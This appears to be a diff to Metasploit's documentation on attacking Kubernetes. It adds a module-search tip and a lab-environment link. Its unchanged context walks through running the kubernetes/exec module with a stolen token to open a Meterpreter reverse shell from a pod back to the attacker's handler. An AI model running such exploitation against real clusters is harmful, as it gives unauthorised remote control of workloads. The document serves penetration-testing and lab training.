@@ -6,7 +6,15 @@ a compromised docker container, or external to the cluster if the required APIs 
 - [modules/auxiliary/cloud/kubernetes/enum_kubernetes](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/cloud/kubernetes/enum_kubernetes.md)
 - [modules/exploit/multi/kubernetes/exec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/kubernetes/exec.md)
 
-A tutorial for setting up a compromisable Kubernetes cluster can be found [here](https://github.com/rapid7/metasploit-framework/blob/master/kubernetes/README.md)
+In the future there may be more modules than listed here, for the full list of modules run the `search` command within msfconsole:
+
+```
+msf6 > search kubernetes
+```
+
+### Lab Environment
+
+A tutorial for setting up a compromisable Kubernetes cluster can be found [here](https://github.com/rapid7/metasploit-framework/tree/master/test/kubernetes)
 
 ### Kubernetes Enumeration
 
@@ -129,7 +137,7 @@ pwd
 If the Kubernetes API is available remotely, the RHOST values and token can be set manually. In this scenario a token is manually specified, to execute a Python Meterpreter payload within the `thinkphp-67f7c88cc9-tgpfh` pod:
 
 ```
-msf6 > use exploit/multi/kubernetes/exec 
+msf6 > use exploit/multi/kubernetes/exec
 [*] Using configured payload python/meterpreter/reverse_tcp
 msf6 exploit(multi/kubernetes/exec) > set TOKEN eyJhbGciOiJSUzI1...
 TOKEN => eyJhbGciOiJSUzI1...
@@ -137,13 +145,13 @@ msf6 exploit(multi/kubernetes/exec) > set POD thinkphp-67f7c88cc9-tgpfh
 POD => thinkphp-67f7c88cc9-tgpfh
 msf6 exploit(multi/kubernetes/exec) > set RHOSTS 192.168.159.31
 RHOSTS => 192.168.159.31
-msf6 exploit(multi/kubernetes/exec) > set TARGET Python 
+msf6 exploit(multi/kubernetes/exec) > set TARGET Python
 TARGET => Python
 msf6 exploit(multi/kubernetes/exec) > set PAYLOAD python/meterpreter/reverse_tcp
 PAYLOAD => python/meterpreter/reverse_tcp
 msf6 exploit(multi/kubernetes/exec) > run
 
-[*] Started reverse TCP handler on 192.168.159.128:4444 
+[*] Started reverse TCP handler on 192.168.159.128:4444
 [*] Sending stage (39736 bytes) to 192.168.159.31
 [*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.31:59234) at 2021-10-01 09:55:00 -0400
 
@@ -154,7 +162,7 @@ Computer     : thinkphp-67f7c88cc9-tgpfh
 OS           : Linux 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021
 Architecture : x64
 Meterpreter  : python/linux
-meterpreter > background 
+meterpreter > background
 [*] Backgrounding session 1...
 msf6 exploit(multi/kubernetes/exec) >
 ```
